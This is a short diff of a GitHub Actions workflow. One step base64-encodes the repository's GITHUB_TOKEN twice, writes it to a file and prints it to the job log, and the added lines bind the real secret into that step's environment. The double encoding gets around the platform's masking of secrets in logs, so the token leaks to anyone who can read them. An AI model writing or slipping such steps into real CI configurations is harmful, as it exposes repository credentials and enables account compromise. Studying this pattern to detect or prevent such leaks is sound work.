@@ -15,3 +15,5 @@ jobs:
           echo "$GITHUB_TOKEN" | base64 | base64 > double_encoded.txt
           echo "Double Encoded GITHUB_TOKEN:"
           cat double_encoded.txt
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
